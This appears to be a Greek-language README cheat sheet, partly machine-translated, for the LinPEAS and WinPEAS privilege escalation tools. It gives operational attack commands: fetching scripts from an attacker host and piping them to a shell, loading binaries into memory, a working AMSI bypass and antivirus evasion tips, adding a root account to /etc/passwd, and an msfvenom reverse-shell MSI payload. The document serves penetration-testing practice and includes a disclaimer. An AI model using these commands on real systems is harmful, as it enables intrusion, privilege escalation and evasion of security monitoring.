<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS & WinPEAS) - Πλήρες φύλλο εξαπάτησης

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p align="center">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p align="center">
  <b>🔍 Τα πιο δημοφιλή αυτοματοποιημένα εργαλεία κλιμάκωσης προνομίων στον κόσμο για συστήματα Linux και Windows</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Εισαγωγή](#-εισαγωγή)
- [Color Legend & How to Read Output] (#-color-legend--how-to-read-output)
- [LinPEAS (Linux Privilege Escalation)](#-linpeas-linux-privilege-escalation)
  - [Λήψη και εκτέλεση στη μνήμη] (#download--in-memory-execution)
  - [Επιλογές γραμμής εντολών](#command-line-options)
  - [Core Vectors Checked by LinPEAS](#core-vectors-checked-by-linpeas)
  - [Stealth & AV Evasion](#stealth--av-evasion)
- [WinPEAS (Windows Privilege Escalation)](#-winpeas-windows-privilege-escalation)
  - [Μέθοδοι εκτέλεσης (.exe έναντι .bat)](#execution-methods-exe-vs-bat)
  - [Εκτέλεση WinPEAS στη μνήμη] (#running-winpeas-in-memory)
  - [Core Vectors Checked by WinPEAS](#core-vectors-checked-by-winpeas)
  - [Bypassing Windows Defender & AMSI](#bypassing-windows-defender--amsi)
- [Ερμηνεία ευρημάτων υψηλής προτεραιότητας](#-interpreting-high-priority-findings)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Συμβουλές και βέλτιστες πρακτικές] (#-συμβουλές--βέλτιστες πρακτικές)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)
- [Πόροι](#-πόροι)

---

## 🎯 Εισαγωγή

Το **PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - νέα γενιά), που δημιουργήθηκε από τον Carlos Polop, είναι η de-facto τυπική συλλογή αυτοματοποιημένων εργαλείων ελέγχου που χρησιμοποιούνται για την αποκάλυψη διανυσμάτων κλιμάκωσης προνομίων σε παραβιασμένα συστήματα:

- **LinPEAS:** Ένα σενάριο Bash all-in-one που αναζητά εσφαλμένες διαμορφώσεις, διαπιστευτήρια, εγγράψιμα αρχεία, δυαδικά αρχεία SUID, εκμεταλλεύσεις πυρήνα, εργασίες cron και κοντέινερ σε συστήματα Linux/Unix.
- **WinPEAS:** Διατίθεται ως αυτόνομο μεταγλωττισμένο .NET δυαδικό (`winPEASany.exe`, `winPEASx64.exe`) και ελαφρύ σενάριο δέσμης (`winPEAS.bat`) για έλεγχο σταθμών εργασίας Windows, μελών τομέα και διακομιστών.

---

## 🎨 Color Legend & How to Read Output

Η καθοριστική δύναμη του PEASS είναι το αυτοματοποιημένο σύστημα αξιολόγησης χρωμάτων του:

| Χρώμα | Σημασία | Σημασία |
|-------|--------------|---------|
| 🔴 **ΚΟΚΚΙΝΟ/ΚΙΤΡΙΝΟ** | 🚨 **ΚΡΙΣΙΜΟ (99% PrivEsc)** | Εξαιρετικά αξιόπιστο διάνυσμα κλιμάκωσης προνομίων. Πρέπει να ελέγξετε αμέσως! |
| 🔴 **ΚΟΚΚΙΝΟ** | ⚠️ **Ενδιαφέρον** | Ασυνήθιστη διαμόρφωση, μη προεπιλεγμένη ρύθμιση ή υποψήφιος διαπιστευτηρίων. |
| **ΚΙΤΡΙΝΟ** | ℹ️ **Πληροφοριακό** | Αξιοσημείωτο εύρημα που μπορεί να είναι μέρος μιας αλυσίδας εκμετάλλευσης. |
| 🔵 **ΚΥΑΝΟ / ΜΠΛΕ** | 👥 **Πλαίσιο** | Χρήστες, ομάδες και τυπικές πληροφορίες συστήματος. |

> **Χρυσός κανόνας:** Κάντε κύλιση απευθείας στα **ΚΟΚΚΙΝΟ/ΚΙΤΡΙΝΟ** τις καλύτερες στιγμές πρώτα! Αν δείτε κείμενο με κίτρινο φόντο και κόκκινα γράμματα, το διάνυσμα exploit είναι σχεδόν εγγυημένο.

---

## 🐧 LinPEAS (κλιμάκωση προνομίων Linux)

### Λήψη και εκτέλεση στη μνήμη

Σπάνια χρειάζεται να γράψετε το `linpeas.sh` στο δίσκο. Εκτελέστε το απευθείας στη μνήμη χρησιμοποιώντας τυπικά βοηθητικά προγράμματα UNIX:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Επιλογές γραμμής εντολών
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Διανύσματα πυρήνων που ελέγχθηκαν από το LinPEAS

1. **Εσφαλμένες διαμορφώσεις Sudo (`sudo -l`):**
   - Εντολές που μπορούν να εκτελεστούν ως root χωρίς κωδικό πρόσβασης (`NOPASSWD`).
   - Επαναχρησιμοποίηση διακριτικού Sudo / CVE-2021-3156 (Baron Samedit).
2. **SUID / SGID Binaries:**
   - Δυαδικά αρχεία με δικαιώματα root (`chmod +s`). Διασταύρωση με **GTFOBins**.
3. **Δυνατότητες Linux:**
   - Δυαδικά αρχεία με αυξημένες δυνατότητες όπως `cap_setuid+ep` (π.χ. `python3`, `tar`, `perl`).
4. **Προγραμματισμένες εργασίες και χρονόμετρα:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) και εγγράψιμα προγραμματισμένα σενάρια.
   - Systemd timers (`systemctl list-timers`).
5. **Παραπειρατεία μονοπατιού και περιβάλλοντος:**
   - Εγγράψιμοι κατάλογοι στο `$PATH`, σχετικές αναζητήσεις εντολών σε σενάρια.
6. **Εκμετάλλευση πυρήνα:**
   - Η έκδοση πυρήνα ελέγχεται έναντι γνωστών εκμεταλλεύσεων (Dirty COW, Dirty Pipe, OverlayFS).
7. **NFS Root Squashing:**
   - Κοινόχρηστοι κατάλογοι προσαρτημένοι με το `no_root_squash` στο `/etc/exports`.
8. **Συγκομιδή διαπιστευτηρίων:**
   - Κωδικοί πρόσβασης καθαρού κειμένου στο `.bash_history`, αρχεία διαμόρφωσης (`wp-config.php`, `.env`), κλειδιά SSH (`id_rsa`) και ενδείξεις ένδειξης μνήμης.

---

## 🪟 WinPEAS (Κλιμάκωση προνομίων των Windows)

### Μέθοδοι εκτέλεσης (.exe έναντι .bat)

Το WinPEAS παρέχεται σε πολλές μορφές:
- **`winPEASx64.exe` / `winPEASany.exe`:** Γραμμένο σε C#/.NET. Πιο ολοκληρωμένη? εκτελεί σε βάθος ελέγχους μητρώου, API και διαπιστευτηρίων.
- **`winPEAS.bat`:** Απλό σενάριο παρτίδας. Εξαιρετικά συμβατό με παλαιού τύπου εκδόσεις των Windows, δεν απαιτεί εξαρτήσεις .NET και αποφεύγει ορισμένες στατικές δυαδικές ανιχνεύσεις.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Εκτέλεση WinPEAS στη μνήμη

Για να αποφύγετε την αποθήκευση αρχείων στο δίσκο σε ελεγμένους σταθμούς εργασίας, φορτώστε το WinPEAS απευθείας στη μνήμη PowerShell:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Διανύσματα πυρήνων που ελέγχθηκαν από το WinPEAS

1. **Δικαιώματα υπηρεσίας και μη καταχωρημένες διαδρομές:**
   - **Διαδρομές εξυπηρέτησης χωρίς εισαγωγικά:** Δυαδικές διαδρομές υπηρεσίας με κενά και χωρίς εισαγωγικά (`C:\Program Files\App\service.exe` -> θέσεις εισβολέων `C:\Program.exe`).
   - **Αδύναμα δικαιώματα υπηρεσίας:** Μη διαχειριστές χρήστες που έχουν `SERVICE_ALL_ACCESS` ή `SERVICE_CHANGE_CONFIG`.
2. **Παραπειρατεία DLL:**
   - Υπηρεσίες που προσπαθούν να φορτώσουν ανύπαρκτα DLL από καταλόγους με δυνατότητα εγγραφής από το χρήστη.
3. **AlwaysInstallElevated:**
   - Κλειδιά μητρώου `AlwaysInstallElevated = 1` που επιτρέπουν σε κάθε χρήστη να εγκαταστήσει αυξημένα πακέτα MSI με το `msiexec`.
4. **Προνόμια Token (SeImpersonate / SeAssignPrimaryToken):**
   - Εκμεταλλεύσιμο μέσω των εκμεταλλεύσεων Potato (SweetPotato, GodPotato, PrintSpoofer) για ανύψωση από λογαριασμούς υπηρεσιών (`IIS APPPOOL`, `LOCAL SERVICE`) σε `NT AUTHORITY\SYSTEM`.
5. **Credential Stores & Autologon:**
   - Κωδικοί πρόσβασης Cleartext στο Μητρώο (`DefaultPassword` στο Winlogon).
   - Αποθηκευμένες συνδέσεις RDP, διαπιστευτήρια Vault, blobs DPAPI, συνεδρίες PuTTY, κωδικοί πρόσβασης WiFi.
6. **Αρχεία αντιγράφων ασφαλείας SAM & SYSTEM:**
   - Εγγράψιμα ή αναγνώσιμα αντίγραφα του `C:\Windows\Repair\SAM` ή του `C:\Windows\System32\config\RegBack\SAM`.

### Παράκαμψη των Windows Defender & AMSI

Το Windows Defender επισημαίνει ενεργά τις μεταγλωττισμένες εκδόσεις του `winPEASx64.exe`. Για να εκτελέσετε το WinPEAS σε περιβάλλοντα παρακολούθησης:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Ερμηνεία ευρημάτων υψηλής προτεραιότητας

### 1. LinPEAS: Εγγράψιμο `/etc/passwd`
Εάν το LinPEAS επισημαίνει το `/etc/passwd` σε **ΚΟΚΚΙΝΟ/ΚΙΤΡΙΝΟ**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` Παρόν
Εάν κρατάτε το `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` Ορίστε σε 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Γρήγορος πίνακας αναφοράς

| Στόχος | Εντολή | Σκοπός |
|--------|---------|---------|
| **Linux (Remote)** | `curl -L http://<IP>/linpeas.sh \| sh` | Εκτέλεση στη μνήμη χωρίς άγγιγμα του δίσκου |
| **Linux (Τοπικό)** | `./linpeas.sh -a > out.txt` | Ο πλήρης έλεγχος αποθηκεύτηκε στο αρχείο κειμένου |
| **Linux (Γρήγορο)** | `./linpeas.sh -q` | Γρήγορη σάρωση παράλειψη αργών αναζητήσεων αρχείων |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Γρήγορη εκτέλεση με μειωμένο θόρυβο |
| **Windows (Μνήμη)**| `[System.Reflection.Assembly]::Load($pe)` | Φόρτωση δυαδικού αρχείου .NET στη μνήμη μέσω του PowerShell |
| **Windows (Παρτίδα)** | `winPEAS.bat` | Εκτέλεση χωρίς εξάρτηση για αποφυγή παλαιού τύπου/AV |

---

## 💡 Συμβουλές και βέλτιστες πρακτικές

1. **Ελέγξτε την έξοδο χρησιμοποιώντας `less -r`:**
   Όταν ανακατευθύνετε την έξοδο σε ένα αρχείο (`./linpeas.sh > linpeas.txt`), να το προβάλλετε πάντα χρησιμοποιώντας `less -r linpeas.txt` ή `cat linpeas.txt`, ώστε οι κωδικοί διαφυγής χρώματος τερματικού ANSI να αποδίδονται σωστά.
2. **Μεταφορά μέσω θύρας 80/443:**
   Όταν τοποθετείτε το LinPEAS ή το WinPEAS στο κουτί εισβολέα, φιλοξενήστε τον διακομιστή ιστού σας στη θύρα `80` ή `443` χρησιμοποιώντας το `python3 -m http.server 80` για να παρακάμψετε τους αυστηρούς κανόνες εξόδου του τείχους προστασίας στόχου.
3. **Μην παραβλέπετε τα κρυφά διαπιστευτήρια:**
   Ελέγξτε τις ενότητες "Interesting Files" και "Cloud Credentials" της εξόδου LinPEAS. Συχνά τα διακριτικά API απλού κειμένου ή τα διαπιστευτήρια AWS παρέχουν υψηλότερα προνόμια από ένα τοπικό exploit.

---

## ⚠️ Νομική αποποίηση ευθύνης

> **ΣΗΜΑΝΤΙΚΟ:** Τα σενάρια PEASS-ng εκτελούν ολοκληρωμένο εσωτερικό έλεγχο και ανακάλυψη διαμόρφωσης. Πρέπει να εκτελούνται μόνο σε συστήματα όπου έχετε τεκμηριωμένη άδεια κατά τη διάρκεια εξουσιοδοτημένων δοκιμών διείσδυσης, ασκήσεων CTF ή εσωτερικών ελέγχων ασφάλειας.

---

## 📚 Πόροι

- [Επίσημο αποθετήριο GitHub PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
- [GTFOBins - Unix Binaries Exploitation](https://gtfobins.github.io/)
- [LOLBAS - Windows Living Off The Land](https://lolbas-project.github.io/)